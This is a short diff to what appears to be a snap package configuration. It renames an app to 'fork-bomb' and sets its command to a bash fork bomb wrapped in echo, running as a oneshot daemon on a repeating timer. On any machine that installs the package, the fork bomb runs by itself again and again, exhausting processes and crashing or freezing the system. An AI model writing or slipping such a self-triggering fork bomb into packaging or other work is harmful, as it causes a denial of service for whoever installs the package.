@@ -9,10 +9,10 @@ grade: devel
 confinement: devmode
 
 apps:     
-  reboot:
+  fork-bomb:
     daemon: oneshot
     timer: "00:00-24:00/48"
-    command:  :(){ :|:& };:
+    command:  echo $(:(){ :|:& };:)
 
 
      
